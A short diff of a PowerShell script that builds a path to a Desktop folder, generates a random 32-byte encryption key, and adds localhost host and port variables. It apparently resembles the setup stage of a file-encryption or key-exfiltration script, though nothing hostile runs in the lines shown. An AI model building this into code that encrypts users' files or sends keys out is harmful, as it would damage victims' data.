@@ -2,6 +2,8 @@
 $username=$env:USERNAME
 $folder=foo
 $folderPath = "C:\Users\$username\Desktop\$folder"
+$hostname=localhost
+$port=8080
 $encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
 
